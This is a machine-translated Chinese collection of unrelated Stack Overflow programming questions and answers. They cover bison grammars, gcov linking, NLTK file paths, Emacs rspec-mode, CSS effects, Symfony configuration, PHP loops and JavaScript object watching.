> 标签：bison, context-free-grammar

我在以下语法上遇到了减少/减少冲突（摘录）

```
 declaration : type list_of_id

        list_of_id : ID                             
                   | list_of_id ',' ID              
                   ;

        type : PATH   
             | SCAL 
             ;

        assignment : ID ":=" param
                   | ID ":=" expr

        param :  point relative_param
              | ID relative_param   

        point : '(' expr ',' expr ')'
              | '(' expr  ':' expr ')'

         relative_param : /* empty rule */ 
                        | "--" '+' param
                        | "--" CYCLE relative_param     
                        | "--" param 

        expr : NB                          
             | ID                         ``                               
             | expr '+' expr              
             | expr '-' expr             
             | expr '*' expr                   
             | expr '/' expr                   
             | '(' expr ')' 
```

我看到当输入是 : foo := bar 时，有两种可能的推导：

1.  赋值-> ID ":=" 参数和参数-> ID
2.  assignment-> ID ":=" expr 和 expr-> ID

我在语法中使用了两次 ID，因为变量可以是 path 类型或 scal 类型。如何在不使用 glr-parser 选项的情况下消除此冲突？

我试图将 ID 拆分为两种可能性： ID_PATH 和 ID_SCAL 并将产品参数和 expr 更改为：

```
param : point relative_param
        | ID_PATH relative_param
        ;

  expr : NB
       | ID_SCAL
       | expr '+' expr
       | expr '-' expr
       | expr '/' expr
       | '(' expr ')' 
```

但在这种情况下，我如何在词法分析器中区分这两个（ID_SCAL 和 ID_PATH）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T18:20:56.687

好吧，正如您所诊断的那样，问题在于您的语法是模棱两可的——它有两种不同的方式来解析输入，例如`Foo := Bar`. 因此，您需要决定的第一件事是，应该是哪一个？你怎么知道？如果您（阅读代码的人）在您尝试解析的语言中看到这一点，您怎么知道`Bar`是表达式还是没有 relative_param 的参数？

如果它依赖于之前的一些声明`Bar`，那么这就是你需要解决的方法。您需要将有关先前看到的声明的信息保存在符号表中，然后在词法分析器中使用该符号表来查找它们被识别的标识符，以确定词法分析器是否应该返回`ID_PATH`或`ID_SCAL`。

如果它取决于先前的声明`Foo`then 你做类似的事情，但你需要将语法更改为更像：

```
assignment: ID_PATH ":=" param
          | ID_SCAL ":=" expr
          ; 
```

# c - gcc ld 错误“libgcov.a(_gcov_merge_add.o) 被 DSO 引用”

> ID：16122599
> 
> 赞同：2
> 
> 时间：2013-04-20T16:27:55.457
> 
> 标签：c, linux, gcc, rhel

尝试使用 gcov 编译我们的代码以实现代码覆盖率。收到以下错误：

> /usr/lib/gcc/i686-redhat-linux/4.4.4/libgcov.a(_gcov_merge_add.o) 中的隐藏符号“__gcov_merge_add”被 DSO /usr/bin/ld 引用：最终链接失败：输出中的不可表示部分collect2: ld 返回 1 个退出状态

为 gcov 新添加了以下编译器选项：

```
-O0 -fprofile-arcs -ftest-coverage  -Xlinker -zmuldefs 
```

和 ld 标志：

```
-fprofile-generate -fprofile-arcs 
```

并与图书馆链接`-lgcov`

请建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T04:10:35.890

我们能够使用简单的`--coverage -O0`编译器选项启用代码覆盖率，并最终链接到`-lgcov`RHEL 6.* 版本。

`-O0 -fprofile-arcs -ftest-coverage -Xlinker -zmuldefs`然而，与我们不得不用来制作启用代码覆盖的二进制文件的 debian 不同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-12-21T06:01:04.387

这个问题的解决方案是

*   编译`-fprofile-arcs -ftest-coverage`
*   链接到`-fprofile-arcs -lgcov`

当我在链接时不使用时，我也遇到了同样的错误`-fprofile-arcs`。

# python - 将 cfg 文件加载到 python - 错误的 URL？

> ID：16122600
> 
> 赞同：0
> 
> 时间：2013-04-20T16:28:11.117
> 
> 标签：python, file, load

这就是我所拥有的：

```
 myGrammar = nltk.data.load('file:C:\Users\Jay\Documents\buffalo.cfg') 
```

我得到的错误是：

```
 `Traceback (most recent call last):
   File "C:\Users\Jay\Documents\Assignment9.py", line 8, in <module>
   myGrammar = nltk.data.load( 'file:C:\Users\Jay\Documents\buffalo.cfg')
 File "C:\Python27\lib\site-packages\nltk\data.py", line 610, in load
   resource_val = nltk.grammar.parse_cfg(_open(resource_url).read())
 File "C:\Python27\lib\site-packages\nltk\data.py", line 689, in _open
   return open(path, 'rb')
  IOError: [Errno 22] invalid mode ('rb') or filename: 'C:\\Users\\Jay\\Documents\x08uffalo.cfg'` 
```

有谁知道我的网址应该是什么？为什么我在错误中得到 x08 而不是 b？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T21:52:16.827

使用 RichieHindle 的答案中所示的原始字符串是纠正字符错误的一种方法。另一个是逃避反斜杠：

```
myGrammar = nltk.data.load('file:C:\\Users\\Jay\\Documents\\buffalo.cfg') 
```

另一个是使用正斜杠而不是反斜杠（在 Windows 中有效）：

```
myGrammar = nltk.data.load('file:C:/Users/Jay/Documents/buffalo.cfg') 
```

如果您在更正此问题后仍然遇到同样的错误，那么这似乎表明您指定的文件位置有问题..您确定该位置正确吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:33:06.833

使用原始字符串 - 注意前导`r`- 用于嵌入反斜杠的字符串：

```
load(r'file:C:\Users\Jay\Documents\buffalo.cfg')
     ^ 
```

否则，您的某些反斜杠（例如 in `\b`）会将普通字符转换为控制字符。

# ruby - font-lock-fontify-keywords-region：符号的函数定义为void：compile--ensure-parse

> ID：16122603
> 
> 赞同：2
> 
> 时间：2013-04-20T16:28:52.703
> 
> 标签：ruby, emacs

当我尝试对任何给定的 Ruby 文件运行规范测试时，我在 Emacs 中遇到了这个错误。我的 gem 以标准方式设置，模块和类`lib/`在`spec/`. 我的`.emacs`文件有以下条目：

;; 红宝石的东西

```
(add-to-list 'load-path "~/.emacs.d/plugins/rvm.el")
(require 'rvm)
(autoload 'ruby-mode "ruby-mode"
  "Mode for editing ruby files" t)
(setq interpreter-mode-alist
      (append '(("ruby" . ruby-mode))
          interpreter-mode-alist))
(autoload 'run-ruby "inf-ruby"
  "Run an inferior Ruby process (irb)" t)
(autoload 'inf-ruby-keys "inf-ruby"
  "Set local key bindings for inf-ruby in ruby-mode")
(add-to-list 'auto-mode-alist '("\\.rake$" . ruby-mode))
(add-to-list 'auto-mode-alist '("\\.gemspec$" . ruby-mode))
(add-to-list 'auto-mode-alist '("\\.rake$" . ruby-mode))
(add-to-list 'auto-mode-alist '("/[Rr]akefile$" . ruby-mode))
(add-to-list 'auto-mode-alist '("/Gemfile$" . ruby-mode))

(add-hook
 'ruby-mode-hook
 (lambda ()
   (rvm-activate-corresponding-ruby)
   (rspec-mode)))

(add-hook
 'ruby-mode-hook
 (lambda ()
   (set (make-local-variable 'compile-command)
    "bundle exec rake")
   (define-key ruby-mode-map "\C-c\C-b" 'compile) ; "Build and Test"
   )
 )

;; RSpec
(add-to-list 'load-path "~/.emacs.d/plugins/rspec-mode")
(require 'rspec-mode)

;; Cucumber
(add-to-list 'load-path "~/.emacs.d/feature-mode-0.4")
(require 'feature-mode)

;; Rinari
(add-to-list 'load-path "~/.emacs.d/plugins/rinari")
(require 'rinari)

;; rails reloaded plugin
(add-to-list 'load-path "~/.emacs.d/plugins/rails-reloaded")
(require 'rails-autoload) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-23T13:02:04.173

rspec-mode在第 435 行的变量中[使用编译--ensure-parse 。](https://github.com/pezra/rspec-mode/blob/24ee15006b14d25167553e3a1326ecb29c7d6ecd/rspec-mode.el#L435)`rspec-compilation-mode-font-lock-keywords`该功能`compilation--ensure-parse`是在 Emacs 24.1 中引入的，因此推测 rspec-mode 不能保证在早期的 Emacs 版本上工作。

# javascript - 使图像在悬停时变为黑白

> ID：16122607
> 
> 赞同：6
> 
> 时间：2013-04-20T16:29:37.363
> 
> 标签：javascript, css

我有一个链接的图像，当用户将鼠标悬停在它上面时，我想让它变成黑白。有人可以帮忙吗？我需要使用 CSS 或 JavaScript 来实现。谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-20T16:31:43.523

尝试这个：

```
img.imgClass:hover {
    filter: url(filters.svg#grayscale); /* Firefox 3.5+ */
    filter: gray; /* IE5+ */
    -webkit-filter: grayscale(1); /* Webkit Nightlies & Chrome Canary */
}
img.imgClass {
    filter: none;
    -webkit-filter: grayscale(0);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2020-09-16T13:56:19.697

```
img .imgClass:hover {
    filter: grayscale(100%);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T16:32:03.550

您可以寻找黑白“面具”。[这](http://demosthenes.info/blog/532/Convert-Images-To-Black-And-White-With-CSS)是一篇关于此的文章。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-20T16:35:55.833

在 CSS 3 中有一个图像过滤器规范，但即使在现代浏览器中也没有得到广泛支持：

```
img:hover {  
  filter: url(filters.svg#grayscale); /* Firefox 3.5+ */
  filter: gray; /* IE5+ */
  -webkit-filter: grayscale(1); /* Webkit Nightlies & Chrome Canary */

} 
```

相反，您可以使用此效果为每个图像制作黑白替代品：

```
<a href="..."><img class="grayscale" src="..." /><img class="color" src="..." /></a> 
```

使用此 CSS：（未测试）

```
a img.grayscale {
  display: none;
}
a:hover img.color {
  display: none;
}
a:hover img.grayscale {
  display: block;
} 
```

默认情况下，灰度图像是隐藏的，悬停时隐藏彩色图像并显示灰度图像。

# python - 多行来自 optparse 帮助字符串的文本换行

> ID：16122613
> 
> 赞同：0
> 
> 时间：2013-04-20T16:30:08.777
> 
> 标签：python, optparse

我正在尝试使我的帮助字符串有所帮助。为此，我有一个`Function()`带有文档字符串的函数，例如

```
def Function(x):
""" First line describing what Function does

Keyword Arguments
x = float -- A description of what x does that may be long

""" 
```

完成此操作后，我认为最后会有类似的东西

```
def parse_command_line(argvs):

    parser = optparse.OptionParser()

    parser.add_option("-f","--Function", help=Function.__doc__,metavar="Bs" )

    (options,arguments) = parser.parse_args(argvs)
    return options, arguments

options, arguments = parse_command_line(sys.argv) 
```

`-h`使用or调用程序时会出现问题`--help`输出是由 OptParse 换行的，这意味着关键字参数没有在新行上开始，是否可以阻止 OptParse 换行输出或者有更好的方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-01-14T21:28:59.930

如果有兴趣，我已经为 argparse 编写了两个这样的格式化程序类。第一个支持许多 mediaWiki、MarkDown 和 POD 语法（甚至是混合的）：

```
import MarkupHelpFormatter
MarkupHelpFormatter.InputOptions["mediawiki"] = True
parser = argparse.ArgumentParser(
    description="""...your text, with mediawiki markup...""",
    epilog='...',
    formatter_class=MarkupHelpFormatter.MarkupHelpFormatter
) 
```

另一个称为“ParagraphHelpFormatter”。它只是像默认的 argparse 格式化程序一样包装文本，除了它尊重空白行。

两者都位于[http://derose.net/steve/utilities/PY/MarkupHelpFormatter.py](http://derose.net/steve/utilities/PY/MarkupHelpFormatter.py)，并以 CCLI Attribution-Share-alike 的形式获得许可。它们为 ANSI 终端接口格式化。不是很精致（例如，自动编号未完成），但您可能会发现它们很有帮助。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-09-13T02:19:26.567

argparse 为您提供原始格式的格式化程序，即您的行不会被包装 parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)

optparse 还可以让您设置格式化程序。我想您可以编写自己的格式化程序，但没有提供我知道的任何内容

# android - 我想使用 android 实现从 MP3 音频到 Html5 的流式传输

> ID：16122615
> 
> 赞同：1
> 
> 时间：2013-04-20T16:30:14.117
> 
> 标签：android, html, streaming, mp3

另外，我想从 android MP3 数据流流式传输到由 Node.js 实现的 WebServer。Android-Node.js：协议是 TCP。在我的项目中，从 android MP3 sound 获取的音频流数据会发送到 node.js，它是 web 服务器。

```
var net = require('net');
var http = require('http');
var fs = require('fs');
var server = http.createServer( function(req, res){
    fs.readFile('index.html', function (error, data) {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(data);

   });  
    console.log('Client connected; streaming');
});
server.listen("8888", "127.0.0.1");

///////// webServer
var object = {};
var WebSocketServer = require('ws').Server;
wss = new WebSocketServer({port: 8080});

wss.on('connection', function(ws) {

    ws.on('message', function(message) {
        ws.send('pong');
    });
    console.log("object[1]====" + object[1]);
});

wss.on('close', function(){
    clearInterval(t);
    console.log(" websocket 연결 끊킴...");
});

//Android Tcp Server
var server_net = net.createServer(function (socket){ 

    socket.on('data', function (data)    {
        wss.clients.forEach(function(client) {
            client.send(  data, {binary:true , mast:true}  );

        });

         console.log(data);    
    });

});
server_net.listen(6666,function (){ 
        console.log('Android Node Server listening port:6666 ');
    }); 
```

// Node.js log : 来自android音频数据的音频数据日志

```
//Web index.html 

<!DOCTYPE html>
<html>
<head>
    <script src='http://code.jquery.com/jquery-1.7.2.min.js' type='text/javascript'></script>
    <script type='text/javascript'>
        var ctx = new webkitAudioContext();
        function playSound(arrBuff) {
            ctx.decodeAudioData(arrBuff , function(buffer){
                var src = ctx.createBufferSource();
                src.buffer = buffer;
                src.looping = false;
                src.connect(ctx.destination);
                src.noteOn(0);           //Play  immediately
                console.log('Finished decoding');
            } ,function(e){
                console.log(e);
            });
        }
        var ws = new WebSocket('ws://210.118.69.173:8080/data');
        ws.binaryType = 'arraybuffer';
        ws.onopen=function(){
            console.log("Connected");
        }
        ws.onmessage = function(e) {
            console.log(e.data.byteLength);
            playSound(e.data);
        }
        ws.onclose = function() {
            console.log("disconnected");
        }
    </script>
</head>
<body></body>
</html> 
```

我无法收听从 Android 获取的音频数据到 web(html5)，有人知道原因吗？请告诉我为什么...

# silverlight-5.0 - ArcGIS API for SIlverlight 3.1 SIlverlight 5：Esri 识别任务

> ID：16122616
> 
> 赞同：0
> 
> 时间：2013-04-20T16:30:22.390
> 
> 标签：silverlight-5.0, arcgis, identify, dataitem

RE：ArcGIS API for SIlverlight 3.1 SIlverlight 5：需要帮助来识别任务

```
I have the following using statements:
using ESRI.ArcGIS.Client;
using ESRI.ArcGIS.Client.Geometry;
using ESRI.ArcGIS.Client.Printing;
using ESRI.ArcGIS.Client.Tasks;
using ESRI.ArcGIS.Client.Toolkit;
using ESRI.ArcGIS.Client.Toolkit.Primitives; 
```

但我在这一行得到一个错误：

```
private List<DataItem> dataItems = null; 
```

找不到类型或命名空间名称“DataItem”（您是否缺少 using 指令或程序集引用？

请帮忙。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-21T21:26:38.173

DataItem 类仅用于定义对象以将数据绑定到视图。如果您查看交互式 SDK 中[识别示例](http://resources.arcgis.com/en/help/silverlight-api/samples/start.htm#Identify)的代码，则 DataItem 在文件底部定义

```
public class DataItem
    {
        public string Title { get; set; }
        public IDictionary<string, object> Data { get; set; }
    } 
```

# iphone - 从标签栏项目开始 iphone 通话

> ID：16122622
> 
> 赞同：1
> 
> 时间：2013-04-20T16:31:17.013
> 
> 标签：iphone, call, uitabbar, uitabbaritem

我很抱歉我的英语。

我正在尝试开发一个应用程序，并且在我的一个标签栏项目中，我想提供启动电话的功能。

我知道可以使用我在另一个主题中找到的以下代码开始通话：

```
[[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"tel:12125551212"]]; 
```

是否可以将此方法集成到“标签栏项目”中？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:51:13.937

您可以使用

```
- (BOOL)tabBarController:(UITabBarController *)tabBarController shouldSelectViewController:(UIViewController *)viewController 
```

并检查 viewController.tabBarItem 甚至返回 NO 以不选择视图控制器并仅启动调用

[UITabBarControllerDelegate](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITabBarControllerDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intf/UITabBarControllerDelegate%20UITabbarControllerDelegate)

# css - 重叠子菜单 ul li's

> ID：16122636
> 
> 赞同：0
> 
> 时间：2013-04-20T16:32:34.723
> 
> 标签：css, menu, html-lists

我的问题很简单解释，但我只是找不到使用萤火虫等的答案......

为什么我的子菜单项重叠？将鼠标悬停在“Aktuelles”上，您可以看到透明的子菜单项重叠，形成难看的白条。ul li 元素没有分配给它们的负边距，那么它们为什么要这样做呢？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:39:24.643

这是因为你给`.main-navigation li`了一个固定的高度。style.css 中的第 946 行。删除高度。此外，盒子阴影`.main-navigation li ul li a`可能会导致一些丑陋的设计。你最好在`.main-navigation li ul`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T16:40:27.083

a的`line-height`a`<a>`高于它的 parent `<li>`。

将`line-height`以下类中的值设置为相等的值：

```
.main-navigation li ul li a
.main-navigation li 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T16:39:52.053

你有这个 css 类：

```
.main-navigation li ul li a:hover {
background: #e3e3e3;
color: #444;
} 
```

像这样改变它：

```
.main-navigation li ul li a:hover {
background: #e3e3e3;
color: #444;
opacity: 0.75;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-20T16:56:52.587

@Bram Vanroy 答案是要走的路...

也试试这个代码

```
.sub-menu li {
    margin: 0;
} 
```

因为`.main-navigation li`样式会影响`li`该菜单中的所有内容，所以这`margin: 0 2.857142857rem 0 0`使得`.sub-menu li`它变得丑陋`margin-right`

# java - Java中的客户端/服务器游戏聊天通信

> ID：16122637
> 
> 赞同：0
> 
> 时间：2013-04-20T16:32:38.990
> 
> 标签：java, client-server, chat, reversi

我目前正致力于在终端内重新创建奥赛罗，在确定它是谁移动时我需要一些帮助。我希望一次只有一个人能够输入他们的动作。它还应该向每个玩家发送一条消息，告诉它是谁在移动。实现这一点的最佳方法是在每个应用程序中运行两个扫描仪——一个监听终端，一个监听键盘。但是我该怎么做呢？谢谢。我引用了这个，但由于某种原因我无法让它工作......当谈到 Protocol 类时，我有点迷茫。

[http://docs.oracle.com/javase/tutorial/networking/sockets/clientServer.html](http://docs.oracle.com/javase/tutorial/networking/sockets/clientServer.html)

# php - Symfony2：没有扩展能够加载配置

> ID：16122641
> 
> 赞同：2
> 
> 时间：2013-04-20T16:32:55.070
> 
> 标签：php, exception, symfony, configuration

我正在构建一个扩展来从所有已安装的捆绑包中加载配置文件。

我的扩展看起来像这样：

```
namespace Acme\MenuBundle\DependencyInjection;
// use ...
use Acme\MenuBundle\DependencyInjection\Configuration;

class AcmeMenuExtension extends Extension {
    public function load(array $configs, ContainerBuilder $container) {

        $configuration = new Configuration();
        $config = $this->processConfiguration($configuration, $configs);

        $finder = new \Symfony\Component\Finder\Finder();
        $finder
            ->directories()
            ->in($container->getParameter('kernel.root_dir') . '/../src/*/*Bundle/Resources')
            ->path('config');

        $possibleLocations = array();
        foreach ($finder as $c_dir) {
            $possibleLocations[] = $c_dir->getPathName();
        }

        $loader = new Loader\YamlFileLoader($container, new FileLocator($possibleLocations));
        $loader->load('menu.yml');
    }
} 
```

然后是我的（非常简单的）配置类：我将来会添加一个更复杂的树，但现在我希望它可以使用：

```
namespace Acme\MenuBundle\DependencyInjection;
// use ...

class Configuration implements ConfigurationInterface {  
    public function getConfigTreeBuilder() {
        $treeBuilder = new TreeBuilder();
        $rootNode = $treeBuilder->root('mw_menu'); 

        $rootNode
            ->children()
                ->scalarNode('mw_menu')->defaultValue('')->end()
            ->end(); 

        return $treeBuilder;
    }
} 
```

为了测试，我只在当前 MenuBundle\Resources\config 中放置了一个“menu.yml”文件，其中包含以下内容：

```
# file: src\Acme\MenuBundle\Resource\config\menu.yml
mw_menu: "some teststring" 
```

对于手动测试，我在默认控制器中使用 testAction，它实际上只渲染一个空模板。

无论如何，我得到这个错误：

```
InvalidArgumentException: There is no extension able to load the configuration for     
"mw_menu" (in {path to symfony}/app/../src/Acme/MenuBundle/Resources\config\menu.yml).
Looked for namespace "mw_menu", found none 
```

**我该如何解决？**

据我目前了解，Symfony 注意到配置文件中的键“mw_menu”，但无法找到匹配的配置。

我按照食谱文章工作：[如何公开语义配置？](http://symfony.com/doc/master/cookbook/bundles/extension.html)

请注意：我知道 Knp Menu Bundle 和类似的 Bundle，但我确实想自己实现一个菜单。

另外我发现[了这个](https://groups.google.com/forum/?fromgroups=#!topic/symfony-users/GX2X_yOOj3g)通知。他是对的吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-22T14:40:13.147

那是因为你的代码：

```
$rootNode = $treeBuilder->root('mw_menu'); 

$rootNode
    ->children()
    ->scalarNode('mw_menu')->defaultValue('')->end()
    ->end(); 
```

意味着配置文件应如下所示：

```
mw_menu: 
    mw_menu: "some teststring" 
```

* * *

## 一个例子：

更具体地说，您需要使代码适应您想要的任何节点。通常，人们使用一般根，例如`mw_menu`，然后使用次要值`database_driver`，如下例所示：

```
$rootNode = $treeBuilder->root('mw_menu'); 

$rootNode
    ->children()
    ->scalarNode('database_driver')->defaultValue('orm')->end()
    ->end(); 
```

然后在配置文件中看起来像这样：

```
mw_menu: 
    database_driver: mongo_db 
```

# python - 通过元组键中的第一个值在 subdicts 中收集值

> ID：16122647
> 
> 赞同：0
> 
> 时间：2013-04-20T16:33:35.450
> 
> 标签：python, dictionary

嗨，我有类似的东西

```
pq={<Timestamp: 2008-02-02 13:30:46>: {('1059', 'latitude'): 40.064889999999998,
                                ('1059', 'longitude'): 116.56359,
                                ('1466', 'latitude'): 39.92163,
                                ('1466', 'longitude'): 116.32633,
                                ('1563', 'latitude'): 39.864249999999998,
                                ('1563', 'longitude'): 116.39328,
                                ('1827', 'latitude'): 40.003770000000003,
                                ('1827', 'longitude'): 116.30907000000001}} 
```

我想要类似的东西

```
pq={<Timestamp: 2008-02-02 13:30:46>: {'1059':{'latitude: 40.064889999999998,'longitude': 116.56359},
                                       '1466' :{'latitude': 39.92163,'longitude': 116.32633},
                                       '1563':{'latitude': 39.864249999999998, 'longitude':116.39328},
                                       '1827':{'latitude': 40.003770000000003,'longitude': 116.30907000000001}} 
```

我怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:39:33.243

您想通过拆分元组键来进行细分。

为了自动创建 subdicts，请使用[`defaultdict`](http://docs.python.org/2/library/collections.html#collections.defaultdict).

遍历要修改的字典项允许您使用元组解包来拆分元组键：

```
>>> import collections
>>> subpq = collections.defaultdict(dict)
>>> for (number, type), value in pq.values()[0].items():
...  subpq[number][type] = value
... 
>>> subpq
defaultdict(<type 'dict'>,
            {'1059': {'latitude': 40.06489, 'longitude': 116.56359},
             '1827': {'latitude': 40.00377, 'longitude': 116.30907},
             '1563': {'latitude': 39.86425, 'longitude': 116.39328},
             '1466': {'latitude': 39.92163, 'longitude': 116.32633}}) 
```

# php - php解析器错误我无法解决

> ID：16122652
> 
> 赞同：-1
> 
> 时间：2013-04-20T16:33:49.470
> 
> 标签：php, syntax-error

我是 php 初学者，在找出为什么我的代码不断抛出解析器错误时遇到了问题。希望你们能帮帮我。

错误出现在代码的末尾，并且是“Unexpected ，expecting while (T_WHILE)”代码在这里...

```
<html>
  <?php
     $db = new PDO('mysql:host=localhost;dbname=testit;charset=UTF-8', 'testit', 'testit', array(PDO::ATTR_EMULATE_PREPARES => false,
 PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));

     $stmt = $db->query("SELECT * FROM TestTable");

     $amdata = array();
     $ctrinner = 0;
     $ctrouter = -1;
     $prevweek = "9999";

     while($row = $stmt->fetch(PDO::FETCH_ASSOC)) do {
        if ($prevweek !== $row['WeekNumber']) {
            $ctrouter++;
            $ctrinner = 0;
            $amdata[$ctrouter][$ctrinner] = 'week: "'+$row['WeekNumber']+'"';
       }
        $ctrinner++;
        $amdata[$ctrouter][$ctrinner] = $row['XAxisCategory']+': '+$row['YAxisValue'];
        $prevweek = $row['WeekNumber'];
     }
     // Whatever comes aftert this line throws a php error 'Unexpected <whatever I put there>, expecting while (T_WHILE)....'
     // Even if I put nothing it complains about Unexpected '?>' expecting while (T_WHILE)  ?>
?>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:42:47.483

你的 do-while 循环是错误的。

do-while 循环如下所示：

```
 do {
     /* loop  body */
 } while (/* condition */); 
```

但在您的特殊情况下，我会简单地省略`do`关键字：

```
while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
   /* loop body */
} 
```

# php - 添加子目录以使我的基于 XML 的用户文件夹不那么滞后是否有帮助？

> ID：16122656
> 
> 赞同：-3
> 
> 时间：2013-04-20T16:34:18.043
> 
> 标签：php, xml

我想创建一个具有登录/注册系统的网站，该系统在主目录中有一个名为“users”的文件夹，其中包含注册页面生成的所有 XML 文件。所有用户的数据都将存储在他们自己单独的 XML 文件中，他们的用户名是文件的名称。正如我在互联网上听到的那样，使用这种方法可能会变得非常滞后，因为服务器必须根据您网站的大小搜索数百到数千个文件。我知道使用数据库可以完全解决滞后问题，但我真的不想在这个项目中使用数据库。所以我想出了一个解决方案，我只是想知道这是否可行，因为一旦我启动该站点，更改用户数据存储方法将是一个巨大的痛苦。我想知道是否可以将子目录添加到我的用户文件夹以按字母顺序保存数据。喜欢：名为“M”的文件夹将包含所有用户 XML 文件，第一个字母是 M。因此，与其尝试在巨大的 XML 文件列表中查找用户，不如搜索一个更小的列表。我想知道这是否会减少它的滞后性。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:36:27.367

那是一种原始索引，它可能会有所帮助，一段时间。您可能会考虑使用诸如[eXist 之](http://exist-db.org/exist/apps/homepage/index.html)类的 XML 数据库，它具有更强大的索引引擎。

# javascript - JavaScript 修改对象原型以监控变化

> ID：16122659
> 
> 赞同：3
> 
> 时间：2013-04-20T16:34:36.657
> 
> 标签：javascript, object, prototype

我正在尝试修改原型，以允许使用字符串比较`Object`监视整个对象（而不仅仅是像 with 之类的属性）的更改。`Object.watch`以下是我到目前为止所拥有的，只要我`myobj.change(...)`在每次修改后调用它就可以工作。

我希望完成的是一种`.change()`在每次修改对象时将其“重新绑定”到对象的方法，这样我就可以设置一个更改处理程序，该处理程序在对象被操作时做出响应。

```
if (!Object.prototype.change) {
    Object.defineProperty(Object.prototype, "change", {
        value: function(handler) {
            var curVal = JSON.stringify(this);
            console.log('CUR:',curVal);
            console.log('STATE:', this.__proto__.state);
            if (curVal!==this.__proto__.state) {
                this.__proto__.state = JSON.stringify(this);
                handler.call(this);
            }
        }
    });
}

var myobj = { foo: 'bar' };
myobj.change(function(){
    console.log('Changed!');
});

myobj = { foo: 'qux' };
myobj.change(function(){
    console.log('Changed!');
});

myobj = { foo: 'sit' };
myobj.change(function(){
    console.log('Changed!');
}); 
```

小提琴在这里：http: [//jsfiddle.net/fluidbyte/GE9t3/](http://jsfiddle.net/fluidbyte/GE9t3/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-08-05T08:04:34.697

## WatchAll 对象

这是一些快速而肮脏的代码，用于监视对象上定义的任何属性的更改。它要求你初始化一个特定类型的新对象，`WatchAll`.

### 代码

```
var WatchAll = function (properties, change_handlers) {
  var obj = Object.create(null);
  var key;
  var i;
  for (key in properties) {
    obj[key] = null;
    Object.defineProperty(this, key, {
      enumerable: true,
      configurable: true,
      get: function () {
        return obj[key];
      },
      set: function (new_value) {
        var old_value = obj[key];
        obj[key] = new_value;
        // notify the change handlers
        for (i = 0; i < change_handlers.length; i++) {
          change_handlers[i](key, old_value, new_value);
        }
      }
    });
    this[key] = properties[key];
  }
};

function logUpdatedProperty (key, old_value, new_value) {
  console.log(key + ' was changed from ' + old_value + ' to ' + new_value);
}

var myobj = new WatchAll({ foo: 'bar', testing: 123 }, [logUpdatedProperty]);
myobj.foo = 'qux';   // from bar to qux
myobj.foo = 'sit';   // from qux to sit
myobj.testing = 456; // from 123 to 456
myobj.foo = 'bar';   // from sit to bar
myobj.testing = 123; // from 456 to test 
```

### JavaScript 版本/浏览器兼容性

我用 NodeJS 测试了代码，但它应该可以在任何浏览器中运行（当然除了 IE8 和 IE7）。[这是 Object.defineProperty 的浏览器兼容性表](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Browser_compatibility)。

## 用 WatchAll 包装现有对象

要包装现有对象，您可以枚举它们的属性并将它们的值复制到具有正确更改处理程序的新 WatchAll 对象：

```
function wrapWithWatchAll (obj, change_handlers) {
  var propagateChangeBackToOriginalObject = function (key, old_value, new_value) {
    obj[key] = new_value;
  };
  return new WatchAll(obj, [propagateChangeBackToOriginalObject].concat(change_handlers));
}

var existingobj = { name: 'omouse', skills: 'programming' };
var wrappedobj = wrapWithWatchAll(existingobj, [logUpdatedProperty]);
wrappedobj.name = 'rudolf';                   // from omouse to rudolf
wrappedobj.skills = 'javascript';             // from programming to javascript
console.log('wrapped: ' + wrappedobj.name);   // rudolf
console.log('existing: ' + existingobj.name); // rudolf 
```

这里的问题是您将不得不在任何地方使用包装对象，因此您必须将现有对象与包装对象交换。

# javascript - 处理（语言）到 Javascript，如何使用 .java 文件加载多个 .pde 源文件？

> ID：16122660
> 
> 赞同：0
> 
> 时间：2013-04-20T16:34:51.653
> 
> 标签：javascript, processing

```
<canvas id=”geometry” data-processing-sources=”ClassFile1.pde ClassFile2.pde main.pde” width=”800″ height=”800″ /> 
```

使用上述方法不起作用，但如果源仅在一个 .pde 内并且不包含 .java 文件，则它可以工作。

无论如何要为 Javascript“应用程序”使用 4 个 .pde 文件和 1 个 .java 文件？

[http://processingjs.org/](http://processingjs.org/) [http://processing.org/](http://processing.org/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T20:55:27.680

这不是“使用多个文件”部分。Processing.js 可以很好地做到这一点。问题是您不能只包含 .java 文件并期望它能够工作。Processing.js 通过将其转换为原生 JS 并在页面上运行来运行处理源代码。如果您使用任何普通的 Java，那么您将不再使用 Processing，您正在使用 Java，并且所有的赌注都没有了。将您的 .java 重写为真正的处理代码（通常相当容易）并将其转换为 .pde 文件，一切应该可以工作。

